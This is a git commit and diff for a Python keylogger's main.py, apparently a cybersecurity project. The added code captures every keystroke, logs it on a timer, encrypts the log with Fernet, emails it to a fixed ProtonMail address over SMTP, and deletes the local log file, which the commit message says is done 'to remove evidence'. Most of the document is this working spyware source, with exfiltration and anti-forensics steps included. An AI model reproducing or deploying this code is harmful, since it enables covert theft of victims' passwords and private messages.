591f48819b6d01d7e19ac34357719386ebaa21ec
richurross <richh.t.le@gmail.com>
2023-04-27 18:19:41 -0700

    Added the ability to encrypt the data file using Fernet. What should be sent now through the email is the encrypted data. At the end of the code, the original data.txt file containing the keystrokes will be deleted to remove evidence

--- main.py
+++ main.py
@@ -1,9 +1,64 @@
 from pynput import keyboard
 
+import os
 import datetime as dt
 import threading
+import requests
 
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+from cryptography.fernet import Fernet
+
+
+# Encryption
+file_path = "C:\\Users\\richie\\PycharmProjects\\keylogger\\data.txt"
+key = Fernet.generate_key()
+with open('key.txt', 'wb') as f:
+    f.write(key)
+fernet = Fernet(key)
+
+
+# Mailing Information
+sender = 'cybersecprojectplus@protonmail.com'
+recipient = 'cybersecprojectplus@protonmail.com'
+smtp_server = 'smtp.protonmail.com'
+smtp_port = 465
+username = 'cybersecprojectplus@protonmail.com'
+password = os.environ.get("PASSWORD")
+subject = 'Logged Information'
+body = "Python Mail"
+
+# Empty string for log data
 string = ""
+
+def send_email(sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, attachment):
+    # Set up the email message
+    msg = MIMEMultipart()
+    msg['From'] = sender
+    msg['To'] = recipient
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'plain'))
+
+    with open(attachment, 'rb') as f:
+        attachment_data = f.read()
+
+    attachment = MIMEBase('application', 'octet-stream')
+    attachment.set_payload(attachment_data)
+    encoders.encode_base64(attachment)
+    attachment.add_header('Content-Disposition', f'attachment; filename="{filename}"')
+    msg.attach(attachment)
+
+
+    # Set up the SMTP connection
+    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
+        server.login(username, password)
+        server.sendmail(sender, recipient, msg.as_string())
+
+    print('Email sent successfully.')
 
 def on_press(key):
     global string
@@ -16,16 +71,15 @@ def on_press(key):
             string += " "
         elif key == keyboard.Key.shift:
             pass
-        #Skip if there is no data in string variable
+        # Skip if there is no data in string variable
         elif key == keyboard.Key.backspace and len(string) == 0:
             pass
-        #Keeps logged keys up to date even with backspace
+        # Keeps logged keys up to date even with backspace
         elif key == keyboard.Key.backspace and len(string) > 0:
             string = string[:-1]
         elif key == keyboard.Key.esc:
             return False
         else:
-            # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
             string += str(key).replace("'", "")
     except AttributeError:
         print(f'special key {key} pressed')
@@ -37,9 +91,10 @@ def on_release(key):
         # Stop listener
         return False
 
+
 def log_data():
     global string
-    threading.Timer(5.0, log_data).start() # schedule next execution in 5 seconds
+    threading.Timer(5.0, log_data).start()  # schedule next execution in 5 seconds
     with open('data.txt', 'a') as f:
         timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
         f.write(f'{timestamp}: {string}\n')
@@ -55,4 +110,22 @@ with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
     listener.join()
+
+# Read log file first then encrypt
+with open('data.txt', 'rb') as f:
+    plaintext = f.read()
+    encrypted = fernet.encrypt(plaintext)
+    encrypted_path = file_path +'.encrypted'
+
+with open('encrypted.txt', 'wb') as f:
+    f.write(encrypted)
+
+filename = os.path.basename(encrypted_path)
+
+send_email(
+    sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, encrypted_path
+)
+
+# Delete evidence
+os.remove(file_path + "\\data.txt")
 
